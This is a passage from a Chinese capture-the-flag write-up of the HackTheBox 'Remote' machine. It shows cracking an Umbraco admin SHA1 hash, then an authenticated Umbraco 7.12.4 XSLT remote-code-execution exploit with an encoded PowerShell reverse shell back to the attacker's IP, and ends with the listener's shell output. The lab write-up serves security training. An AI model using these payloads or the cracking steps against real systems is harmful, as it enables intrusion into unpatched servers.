&lt;admin@htb.local&gt;umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1u</span>mbraco/user/sign-in/failedlogin failed<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>adminAdministratorsCADMOSKTPIURZ:<span class="hljs-number">5F</span>7<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating TourData, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.137U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate<br></code></pre></td></tr></table></figure>
+
+<p>11、开始破解管理员哈希值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo -n <span class="hljs-string">&#x27;b8be16afba8c314ad33d812f22a04991b90e2aaa&#x27;</span> &gt; hash<br>                                                                                                               <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo john hash --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt<br>Using <span class="hljs-keyword">default</span> input encoding: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> password hash (Raw-SHA1 [SHA1 <span class="hljs-number">128</span>/<span class="hljs-number">128</span> ASIMD <span class="hljs-number">4</span>x])<br>Warning: no OpenMP support <span class="hljs-keyword">for</span> this hash type, consider --fork=<span class="hljs-number">4</span><br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to <span class="hljs-built_in">abort</span>, almost any other key <span class="hljs-keyword">for</span> status<br>baconandcheese   (?)     <br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-16</span> <span class="hljs-number">21</span>:<span class="hljs-number">42</span>) <span class="hljs-number">1.136</span>g/s <span class="hljs-number">11163</span>Kp/s <span class="hljs-number">11163</span>Kc/s <span class="hljs-number">11163</span>KC/s baconandchipies1..baconandcabbage<br>Use the <span class="hljs-string">&quot;--show --format=Raw-SHA1&quot;</span> options to display all of the cracked passwords reliably<br>Session completed. <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo hashcat -m <span class="hljs-number">100</span> hash /usr/share/wordlists/rockyou.txt<br>b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese <br></code></pre></td></tr></table></figure>
+
+<p>12、到这里就获取到了账号密码信息了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">admin@htb.local<br>baconandcheese<br></code></pre></td></tr></table></figure>
+
+<p>13、开始登录首页的网站后台</p>
+<p><code>http://10.10.10.180/umbraco/#/forms</code></p>
+<p><img src="http://sh1yan.top/photo/Remote-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>14、进入到后台后，我们发现了版本信息等</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">admin<br><br>Umbraco version <span class="hljs-number">7.12</span><span class="hljs-number">.4</span> assembly: <span class="hljs-number">1.0</span><span class="hljs-number">.6879</span><span class="hljs-number">.21982</span><br></code></pre></td></tr></table></figure>
+
+<p>15、开始搜索相关漏洞进行利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit umbraco <span class="hljs-number">7.12</span><span class="hljs-number">.4</span><br>----------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                               |  Path<br>----------------------------------------------------------------------------- ---------------------------------<br>Umbraco CMS <span class="hljs-number">7.12</span><span class="hljs-number">.4</span> - (Authenticated) Remote Code Execution                   | aspx/webapps/<span class="hljs-number">46153.</span>py<br>Umbraco CMS <span class="hljs-number">7.12</span><span class="hljs-number">.4</span> - Remote Code <span class="hljs-title function_">Execution</span> <span class="hljs-params">(Authenticated)</span>                   | aspx/webapps/49488.py<br>----------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br><br>┌──<span class="hljs-params">(kali㉿offsec)</span>-[~/Desktop]<br>└─$ searchsploit -m 46153               <br>  Exploit: Umbraco CMS 7.12.4 - <span class="hljs-params">(Authenticated)</span> Remote Code Execution<br>      URL: https:<span class="hljs-comment">//www.exploit-db.com/exploits/46153</span><br>     Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py<br>    Codes: N/A<br> Verified: False<br>File Type: Python script, ASCII text executable<br>Copied to: /home/kali/Desktop/46153.py<br></code></pre></td></tr></table></figure>
+
+<p>16、这里这个poc需要自己调试一下具体的参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">login = <span class="hljs-string">&quot;admin@htb.local&quot;</span>;<br>password=<span class="hljs-string">&quot;baconandcheese&quot;</span>;<br>host = <span class="hljs-string">&quot;http://10.10.10.180&quot;</span>;<br><br># Execute a calc <span class="hljs-keyword">for</span> the PoC<br>payload = <span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; \</span><br><span class="hljs-string">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; \</span><br><span class="hljs-string">xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;\</span><br><span class="hljs-string">&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() \</span><br><span class="hljs-string">&#123; string cmd = &quot;/c ping 10.10.14.8&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\</span><br><span class="hljs-string"> proc.StartInfo.FileName = &quot;cmd.exe&quot;; proc.StartInfo.Arguments = cmd;\</span><br><span class="hljs-string"> proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \</span><br><span class="hljs-string"> proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; &#125; \</span><br><span class="hljs-string"> &lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt;\</span><br><span class="hljs-string"> &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>17、这里先使用ping命令，看看能否执行命令成功</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 <span class="hljs-number">46153.</span>py<br>Start<br>[]<br>End<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo tcpdump -i tun0 icmp<br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type <span class="hljs-title function_">RAW</span> <span class="hljs-params">(Raw IP)</span>, snapshot length 262144 bytes<br>22:05:28.264515 IP 10.10.10.180 &gt; 10.10.14.8: ICMP echo request, id 1, seq 1, length 40<br>22:05:28.264652 IP 10.10.14.8 &gt; 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40<br>22:05:29.274109 IP 10.10.10.180 &gt; 10.10.14.8: ICMP echo request, id 1, seq 2, length 40<br>22:05:29.274167 IP 10.10.14.8 &gt; 10.10.10.180: ICMP echo reply, id 1, seq 2, length 40<br>22:05:30.269543 IP 10.10.10.180 &gt; 10.10.14.8: ICMP echo request, id 1, seq 3, length 40<br>22:05:30.269602 IP 10.10.14.8 &gt; 10.10.10.180: ICMP echo reply, id 1, seq 3, length 40<br>22:05:31.262638 IP 10.10.10.180 &gt; 10.10.14.8: ICMP echo request, id 1, seq 4, length 40<br>22:05:31.262695 IP 10.10.14.8 &gt; 10.10.10.180: ICMP echo reply, id 1, seq 4, length 40<br>^C<br>8 packets captured<br>8 packets received by filter<br>0 packets dropped by kernel<br></code></pre></td></tr></table></figure>
+
+<p>18、这里修改下利用代码直接构造一个反弹shell过来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"># Execute a calc <span class="hljs-keyword">for</span> the PoC<br>payload = <span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; \</span><br><span class="hljs-string">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; \</span><br><span class="hljs-string">xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;\</span><br><span class="hljs-string">&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() \</span><br><span class="hljs-string">&#123; string cmd = &quot;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\</span><br><span class="hljs-string"> proc.StartInfo.FileName = &quot;cmd.exe&quot;; proc.StartInfo.Arguments = cmd;\</span><br><span class="hljs-string"> proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \</span><br><span class="hljs-string"> proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; &#125; \</span><br><span class="hljs-string"> &lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt;\</span><br><span class="hljs-string"> &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><code>https://sh1yan.top/rt-cmd/</code></p>
+<p><img src="http://sh1yan.top/photo/Remote-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>19、开始利用，获取初始权限</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 <span class="hljs-number">46153.</span>py<br>Start<br>[]<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">443</span>        <br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.8</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>] <span class="hljs-number">49707</span><br>whoami<br>iis apppool\defaultapppool<br>PS C:\windows\system32\inetsrv&gt; <br>PS C:\windows\system32\inetsrv&gt; whoami<br>iis apppool\defaultapppool<br>PS C:\windows\system32\inetsrv&gt; <br><br><br>PS C:\&gt; ls<br><br>    Directory: C:\<br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">1</span>:<span class="hljs-number">13</span> AM                ftp_transfer                                                          <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">11</span> PM                inetpub                                                               <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">11</span>:<span class="hljs-number">09</span> PM                Microsoft                                                             <br>d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">3</span>:<span class="hljs-number">19</span> AM                PerfLogs                                                              <br>d-r---         <span class="hljs-number">7</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">7</span>:<span class="hljs-number">41</span> AM                Program Files                                                         <br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">19</span> PM                Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>                                                   <br>d-----        3/16/2024   9:34 AM                site_backups                                                          <br>d-r---        2/19/2020   3:12 PM                Users                                                                 <br>d-----        8/17/2021   9:34 AM                Windows                                                               <br><br>PS C:\&gt; <br><br>PS C:\&gt; cd Users<br>PS C:\Users&gt; dir<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----        2/19/2020   3:12 PM                .NET v2.0                                                             <br>d-----        